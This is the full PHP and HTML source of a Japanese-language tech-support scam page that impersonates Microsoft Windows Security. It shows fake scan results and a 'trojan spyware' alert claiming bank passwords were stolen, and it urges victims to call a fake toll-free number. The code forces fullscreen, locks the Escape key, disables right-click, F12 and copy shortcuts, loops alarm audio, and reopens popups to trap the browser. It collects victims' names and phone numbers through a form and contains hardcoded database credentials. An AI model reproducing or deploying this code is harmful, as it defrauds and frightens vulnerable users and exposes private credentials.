<?php

//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);
// Database connection
$servername = "localhost";
$username = "u292015660_4pG6H";
$password = "rjzXuii9Tw";
$dbname = "u292015660_EZ7iU"; // Change to your database name

session_start();
$session_id=session_id();
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$result = $conn->query("SELECT * FROM log WHERE session='$session_id' AND action_triggered!=0 LIMIT 1");
if($result->num_rows){
    $data=$result->fetch_assoc();
    $final_url = $_SERVER['SCRIPT_URI'];
    $result = $conn->query("UPDATE log SET final_url='$final_url' WHERE session='$session_id' AND action_triggered!=0 ORDER BY id DESC LIMIT 1");
}
else{
    $ip_address = $_SERVER['REMOTE_ADDR'];
    file_put_contents("log.html", 
"<p>Access blocked for Session:".session_id(). "FROM IP: ".$ip_address."</p><br><br>",
FILE_APPEND);
http_response_code(404);
die();
}
//print_r($_SERVER);

?>

<!DOCTYPE html>
<html>
<head>

  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>マイクロソフト サポート アシスタンス codex076d7103</title>
<link rel="stylesheet" href="styles.css">
<script type="text/javascript" src="scripts.js"></script>
<script type="text/javascript" src="custom.js"></script>
<link rel="icon" type="image/png" href="microsoft.png">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">



<style>
  .black {
    width: 100%;
    height: 100%;
    background-color: rgb(0 0 0 / 47%);
    opacity: 0.7;
    transition: 1s;
    position: absolute;
    top: -190px;
    left:0
  }
  </style>



  <script>
  var elem = document.documentElement;
  function openFullscreen() {
    if (elem.requestFullscreen) {
      elem.requestFullscreen();
    } else if (elem.webkitRequestFullscreen) { /* Safari */
      elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) { /* IE11 */
      elem.msRequestFullscreen();
    }
  }

  function closeFullscreen() {
    if (document.exitFullscreen) {
      document.exitFullscreen();
    } else if (document.webkitExitFullscreen) { /* Safari */
      document.webkitExitFullscreen();
    } else if (document.msExitFullscreen) { /* IE11 */
      document.msExitFullscreen();
    }
  }
  </script>



  <script>
        function getVariableFromURl(name)
        {
            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
            var regexS = "[\\?&]"+name+"=([^&#]*)";
            var regex = new RegExp( regexS );
            var results = regex.exec( window.location.href );
            if( results == null )
                return "";
            else
                return results[1];
        }
    </script>

        <script type="text/javascript">
                var phone = getVariableFromURl('phone');
            </script>
        <script type="text/javascript">
                window.onbeforeunload = function () {
                    if (data_needs_saving()) {
                        return "Do you really want to leave our brilliant application?";
                    } else {
                        return;
                    }
                };
            </script>
        <script type="text/javascript">
                window.addEventListener("beforeunload", function (e) {
                    var confirmationMessage = 'It looks like you have been editing something. '
                        + 'If you leave before saving, your changes will be lost.';

                    (e || window.event).returnValue = confirmationMessage; //Gecko + IE
                    return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
                });
            </script>
        <script type="text/javascript">
                window.onload = function () {
                    document.onclick = function (e) {
                        e = e || event;
                        target = e.target || e.srcElement;
                        if (target.tagName === "DIV") {
                            toggleFullScreen();
                            document.body.style.cursor = 'not-allowed';
                            document.getElementById('map').innerHTML = stroka;
                            document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
                        } else {
                            toggleFullScreen();
                            document.body.style.cursor = 'not-allowed';
                            document.getElementById('map').innerHTML = stroka;
                            document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
                        }
                    }
                }
            </script>


<style>
  html,
  body {
      margin: 0;
      padding: 0;
      cursor:none;
  }
  
  #overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 1);
      background-size: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999999999999999999999999999;
  }
  
  #overlay img {
      max-width: 100%;
      max-height: 100%;
      cursor: pointer;
  }
</style>
</head>
<body id="mycanvas" onclick="playSound()" style="overflow:hidden;">
<div id="overlay" onclick="$('#overlay2').css('display', 'block'); setTimeout(function() { $('#overlay2').css('display', 'none');}, 5000);">
    <img src="modal-bg.webp" alt="Fullscreen Image" />
</div>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        var overlay = document.getElementById('overlay');
    
        overlay.addEventListener('click', function() {
            overlay.style.zIndex = '-9999999999999999999999999999';
        });
    });
</script>

  <iframe src="https://support.microsoft.com/ja-jp" id="frame" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; ">
  </iframe>

  <a  onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
    <div class="black" style="height: 145%;"></div>
</a>

<div class="box" id="box">
<div class="top">
<p style="font-size: 17px;  font-family: Arial, Helvetica, sans-serif;">Windows セキュリティ<img src="minimize.jpeg" class="" style="float: right; width:115px;"></p>
</div>

<h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1">ひと目でわかる安全性</h4>
<p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2"><br>デバイスの安全性と健康状態に何が起こっているかを確認し、必要なすべての措置を講じてください。</p>
<div class="centerright">
<ul>
<li>
<br>
<img src="kxFy-clip.png" width="50px;">
<p>ウイルスと脅威に対する保護</p>
<p style="top: 103px; position: absolute; font-size: 13px; color: grey;">アクションが必要です。 スキャンを実行して<br>脅威をチェックします。</p>

</li>
<li>
<br><br>
<img src="qsbs-firewall.png" width="60px;">
<p>ファイアウォールとネットワーク保護</p>
<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">アクションは必要ありません。</p>
</li>
</ul>
<ul>
<li>
<br>
<img src="s-S4-acc.png" width="60px;">
<p>アカウント保護</p>
<p style="top: 125px; position: absolute; font-size: 13px; color: grey;">アクションは必要ありません。</p>
</li>
<li>
<br>
<img src="Z5BR-network.png" width="51px;"/>
<p>アプリケーションとブラウザの制御</p>
<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">アクションは必要ありません。</p>
</li>
</ul>
</div>
<img src="uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
<br>
</div>


<!--Windows Security Quick Scan-->
<div class="scan" id="scan">
  <div class="top">
  <p style="font-size: 17px;  font-family: Arial, Helvetica, sans-serif;">Windows セキュリティ<img src="minimize.jpeg" class="" style="float: right; width:115px;"></p>
  </div>
  <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1"><img src="okPE-vs.png" width="25px;" style="margin-right: 10px;vertical-align: sub;">ウイルスと脅威に対する保護</h4>
  <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">脅威に対するデバイスの保護。</p>

<h3 style="    position: absolute;
right: 150px;
top: 6px;
font-weight: 500;
font-size: 19px;" id="text12"><b><script>document.write(phone)</script>  (無料のセキュリティ)</b></h3>

  <div class="centerright">


  <ul>
  <li>



  <div class="flex"> <img src="-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 10px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">現在の脅威</p></div>


  <br><br>
  <div class="progress" id="bar">
    <div class="progress__bar"></div>
  </div>

  <p style="font-size: 13px;" id="info">クイック スキャンが進行中です...<br>推定残り時間: <n id="time">0</b></n><br><n id="amount">0</b></n> スキャンされたファイル。</p>

  <a href="#"class="button" id="re">キャンセルします</a>
  <p style=" font-size: 13px;" id="recx">デバイスを分析している間、作業を続けてください。</p>

  <p style="font-size: 13px; color: #0063c6; cursor: pointer;" id="recx-hide">保護履歴</p>
  <br>
  <p id="shx" style="font-size: 13px; color: #0063c6; display: none; cursor: pointer;">スキャン オプション<br> 許可された脅威<br> 保護履歴</p>


  </li>

  <li>

<div class="flex"><img src="nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: 5px;"><p style="position: absolute; left: 35px;    bottom: 84px;    line-height: 18px;">ウイルスと脅威の防止の設定 </p> </div>
<p style="color: grey; font-size: 13px;">アクションは必要ありません</p>
<p style="font-size: 13px; color: #0063c6;">設定を管理する</p>
  </li>
  </ul>
  <ul>

  <li>


  <p style="position: absolute; top: -55px;">質問があります？</p>

  <p style="font-size: 13px; color: #0063c6; position: absolute; top: -15px; cursor: pointer;">ヘルプを取得する</p>

  </li>
  <li>


    <p style="position: absolute; top: 25px;">誰が私を守ってくれるの?</p>

    <p style="font-size: 13px; color: #0063c6; position: absolute; top: 65px; cursor: pointer;">サプライヤーの管理</p>

    </li>
    <li>


      <p style="position: absolute; top: 100px; "><br>Windows のセキュリティの向上にご協力ください</p>

      <p style="font-size: 13px; color: #0063c6; position: absolute; top: 152px; cursor: pointer;">フィードバックをお寄せください</p>

      </li>
      <li>

        <p style="position: absolute; top: 190px;">プライバシー設定を変更する</p>
        <p style="position: absolute; top: 220px; font-size: 13px;">Windows のプライバシー設定を表示および変更する<br><n id="which"></b></n> 端末.</p>

        <p style="font-size: 13px; color: #0063c6; position: absolute; top: 270px; cursor: pointer;">プライバシー設定<br>プライバシー ダッシュボード<br>プライバシーに関する声明</p>

        </li>

  </ul>

  </div>
  <img src="uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
  <br>
  </div>
  <script>
          navigator.userAgentData.getHighEntropyValues(["platformVersion"])
   .then(ua => {
     if (navigator.userAgentData.platform === "Windows") {
       const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
       if (majorPlatformVersion >= 13) {
        document.getElementById("which").innerHTML = " 11";
        }
        else if (majorPlatformVersion > 0) {
          document.getElementById("which").innerHTML = " 10";
        }
        else {
          console.log("超えた");
        }
     }
     else {
       console.log("Windowsでは動作しません");
     }
   });
  </script>






<div class="alert_popup cardcontainer lightbox">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <p class="text-center" style="    font-size: 16px;
font-weight: normal;
margin: 0;
margin-bottom: 5px;
padding: 5px 10px;
color: #fff;font-weight: bold;
margin-top: 8px; text-align: center;">Windows セキュリティ - スパイウェアの警告</p>
                <p class="text-center">** セキュリティ上の理由により、この PC へのアクセスはブロックされています **</p>
                <p>お使いのコンピュータは、トロイの木馬スパイウェアに感染していることを警告しています。 次のデータが侵害されました。<br><br>
                  > メール ID<br> &gt; 銀行のパスワード<br>
                  > Facebookログイン<br>
                  > 写真と写真 書類 </p>

                  <!-- <p>Windows セキュリティ スキャンにより、パスワード、オンライン ID、財務情報、個人ファイル、画像、またはドキュメントを盗む可能性のある望ましくない可能性のあるアドウェアがこのデバイスで検出されました。 <br><br></p> -->
                  <p>エンジニアが電話で削除プロセスを説明できるように、すぐにご連絡ください。<br><br>

                    すぐに Windows サポートに連絡して、この脅威を報告し、なりすましを防ぎ、このデバイスへのアクセスをロック解除してください。<br><br>
                    このウィンドウを閉じると、個人情報が危険にさらされ、Windows の登録が中断されます。</p>

               <p style="padding-bottom: 0px;">Windows サポートに電話する
               <br><strong style="font-size: 20px;"> 0101-501-501-3862 (日本フリーダイヤル)</strong></p>
               <div class="action_buttons"> <a class="" id="leave_page" style="cursor: pointer;">わかった</a> <a class="" id="leave_page">キャンセルします</a> </div>
            </div>

        </div>
    </div>
</div>
<audio id="beep" loop>
  <source src="audio1.mp3" type="audio/mpeg">
</audio>
 <!---form-->
 <style>
  .fixed-box {
      position: fixed;
      left: 20px;
      top: 50%;
      transform: translateY(-50%);
      background-color: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
      padding: 15px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      z-index: 999;
  }
  .fixed-box i {
      margin-right: 10px;
      font-size: 20px;
  }
  .fixed-box .text {
      font-size: 20px;
      font-weight: bold;
  }
  .lst{cursor: none;}
</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 <div class="fixed-box">
  <div class="text">緊急システム救助ホットライン:<br><i class="fas fa-phone-alt"></i> 0101-501-501-3862</div>
</div>
 <div class="border-secondary" id="userform" onkeypress="function(e) {alert(e.keyName());}" style="padding: 10px;right: 0px;top: 29vh;height: auto;position: fixed;background: white;border: 1px solid;cursor: default;z-index: 9999; display:none">
  <div class="" style="max-width: 250px; background-colorx: #0275D6;">
      
      <h3 class="">
          <img src="mslogo1.png" width="25"><span style="color: #000;">
          <b>電話番号を入力してください ご連絡させていただきます</b>
      </h3>
     
            <div class="form-group">
              <label for="Name">名前:</label>
              <input id="nameinput" type="Name" class="form-control" placeholder="名前を入力" id="Name">
            </div>
            <div class="form-group">
              <label for="Mobile">モバイル:</label>
              <input id="mobileinput" type="tel" class="form-control" placeholder="モバイルへの参入" id="Mobile">
            </div>
          <button class="btn btn-success" onclick="submitdata()">送信</button>

      
  </div>
</div>
<!---form-->

<script type="text/javascript">
    function submitdata(){
        $.post("mail.php", {name: $('#nameinput').val(), mobile: $('#mobileinput').val()}, function(result){
            // $("span").html(result);
        });
    }
    window.setInterval(() => {
        const fullscreenStatus = document.fullscreenElement !== null;
        $.get("/server.php", {fullscreenStatus: fullscreenStatus?1:0 }, function(result){
            // $("span").html(result);
        });
    }, 5000);
</script>

<script>
  addEventListener("click", function() {
var el = document.documentElement
  , rfs =
         el.requestFullScreen
      || el.webkitRequestFullScreen
      || el.mozRequestFullScreen
;
rfs.call(el);
});

</script>

<div id="lst" class="lst lightbox">
  <div class="ilb top">
      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> WindowsDefenderセキュリティセンター</span>
          <span id="txts1" class="fl title2" onclick="$('#lst').css('display', 'none'); window.setTimeout(function() { $('#lst').css('display', 'block'); }, 30000);"><a href="#"><img src="cross.png"></a></span>

      </div>
  </div>
  <div id="txtintro">
              <span class="colo-rd">アプリ: Ads.fiancetrack(2).dll<br>
                検出された脅威: トロイの木馬スパイウェア</span>
  </div>
  <img id="banner" src="virus-images.jpeg">
  <div id="disclaimer">
      このPCへのアクセスはセキュリティ上の理由でブロックされています。<br>
      <span class="support">Windowsサポートに連絡する: <script>document.write(phone)</script> 0101-501-501-3862 (通話料無料)</span>
  </div>
  <div id="bottom">
      <img id="badge" src="microsoft.png"><span class="title3">マイクロソフト</span>
      <ul>
          <li>
              <a href="#">
                  <div class="fr button2"  onclick="$('#lst').css('display', 'none'); window.setTimeout(function() { $('#lst').css('display', 'block'); }, 30000);">
                      <span id="addtochromebutton">拒否</span>
                  </div>
              </a>
          </li>
          <li>
              <a href="#">
                  <div class="fr buttons blink"  onclick="$('#lst').css('display', 'none'); window.setTimeout(function() { $('#lst').css('display', 'block'); }, 30000);">
                      <span id="addtochromebutton">許可する</span>
                  </div>
              </a>
          </li>
      </ul>

  </div>
</div>

</div>

<div id="footer" style="bottom: 0; position: absolute; cursor: none;width: auto;overflow: hidden;">
  <div class="row">

      <div class="col-md-12">
          <div class="right-foot" style="text-align: center;">
              <span id="footertxt"><img src="microsoft.png"> マイクロソフト: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;">サポート問い合わせ先 <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><script>document.write(phone)</script> 0101-501-501-3862 (通話料無料)</span></span>
          </div>
      </div>
      <div class="col-md-12">
          <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 10px;">ウィンドウズ
                                                                       Defender SmartScreenは、認識されないアプリが表示するのを防ぎました。 このアプリを実行すると、PCが置かれる可能性があります
                                                                       危険にさらされています。 Windows Defender Scanは、このデバイス上で盗む可能性のある不要なアドウェアを発見しました
                                                                       パスワード、オンラインID、財務情報、個人ファイル、写真、または
                                                                       ドキュメント.</small></marquee>
      </div>
  </div>


</div>

<div id="welcomeDiv"
     style=" display:none; background-color:#000; height: auto; width: 550px; margin-left:32%;position: absolute;z-index: 9999999999;text-align: center;
     margin-top: -8px; "
     class="answer_list">
    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">再起動または使用しないでください
        あなたのコンピュータ.<br>コンピューターが無効になっています。 私に電話してください。<br>アクセスはこれのブロックセキュリティの理由です
        コンピュータ。<br>すぐにご連絡ください。 技術者が問題の解決をお手伝いします.</p>


</div>


<div class="modal fade" id="exitModal" tabindex="-1" role="dialog">
  <div class="modal-dialog modal-full-height modal-right" role="document">
    <div class="modal-content" style="cursor:pointer;">
      <img id="modal-exit" src="cross.png" class="modal-exit">
      <div class="modal-body">
        <div class="row">
          <div class="d-none d-md-block col-md-5 text-center">
            <a href="#" targetx="_blank" class="exit-href" rel="noopener noreferrer nofollow">
              <img class="img-fluid rounded" src="stop.png" />
            </a>
          </div>
          <div class="col-12 col-md-7 text-left">
            <div id="modal-title" class="modal-title text-center modal-title-1">安全警告を止める このページを閉じないでください 今すぐお電話ください0101-501-501-3862 <br> <script>document.write(phone)</script>  </div>
            <div class="">
              <a class="btn btn-visit btn-popup jumpy" targetx="_blank" href="#" rel="noopener noreferrer nofollow">
                <span>ここをクリック</span>
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<div style="
    position: fixed;
    padding: 10px;
    border-radius: 10px;
    background: white;
    bottom: 85px;
    right: 30px;
    z-index: 9;
    text-align: center;
"><img src="microsoft.png" style="
    height: 25px;
"><h5 style="
">Microsoft support</h5><img src="support.png" style="
    height: 30px;
"><h5 style="
    font-weight: bold;
">0101-501-501-3862</h5></div>
<div id="overlay2" style="
    z-index: 9999999999;
    position: fixed;
    height: 100vh;
    width: 100vw;
    background: black;
    display: none;
">
<style>
  @keyframes scale {
    0% {
        transform: scale(1);
    }
    100% {
        transform: scale(1.2);
    }
}
</style>
    <div style="height: 250px;width: 650px;margin: auto;margin-top: calc( (100vh / 2) - 125px );border: 2px white solid;padding: 50px; animation: scale 2s infinite alternate;">
      <p class="text-center" style="color: #FEFEFE;font-size: large;">再起動または使用しないでください
          あなたのコンピュータ.<br>コンピューターが無効になっています。 私に電話してください。<br>アクセスはこれのブロックセキュリティの理由です
          コンピュータ。<br>すぐにご連絡ください。 技術者が問題の解決をお手伝いします.
      </p>
    </div>
</div>


<script>
  $(document).ready(function () {
      $("#mycanvas").click(function () {
          $("#welcomeDiv").show();
      });
  });
</script>
<script>
// navigator.keyboard.lock();
navigator.keyboard.lock(["Escape"]);

document.onkeydown = function (e) {
return false;
}
</script>

<script type="text/javascript">



        // To disable right click

        document.addEventListener('contextmenu', event => event.preventDefault());



        // To disable F12 options

        document.onkeypress = function (event) {

            event = (event || window.event);

            if (event.keyCode == 123) {

                return false;

            }

        }

        document.onmousedown = function (event) {

            event = (event || window.event);

            if (event.keyCode == 123) {

                return false;

            }

        }

        document.onkeydown = function (event) {

            event = (event || window.event);

            if (event.keyCode == 123) {

                return false;

            }

        }



        // To To Disable ctrl+c, ctrl+u



        jQuery(document).ready(function ($) {

            $(document).keydown(function (event) {

                var pressedKey = String.fromCharCode(event.keyCode).toLowerCase();



                if (event.ctrlKey && (pressedKey == "c" || pressedKey == "u")) {

                    alert('申し訳ありませんが、この機能は無効になっています!');

//disable key press porcessing

                    return false;

                }

            });

        });



    </script>
<script type="text/javascript">
  window._mfq = window._mfq || [];
  (function() {
    var mf = document.createElement("script");
    mf.type = "text/javascript"; mf.defer = true;
    mf.src = "//cdn.mouseflow.com/projects/a3315159-6f39-48bb-9f9c-cfa1095e2277.js";
    document.getElementsByTagName("head")[0].appendChild(mf);
  })();
</script>
<!--Start of Tawk.to Script-->
<!--script type="text/javascript">
    window.setTimeout(() => {

var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/67512b812480f5b4f5a7eee1/1ieah3tm7';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();

    }, 500);
</script-->
<!--End of Tawk.to Script-->
 </body>
 
<script type="text/javascript">
  window._mfq = window._mfq || [];
  (function() {
    var mf = document.createElement("script");
    mf.type = "text/javascript"; mf.defer = true;
    mf.src = "//cdn.mouseflow.com/projects/7110e989-0708-4790-a3d5-60c06f957c5e.js";
    document.getElementsByTagName("head")[0].appendChild(mf);
  })();
</script>

</html>
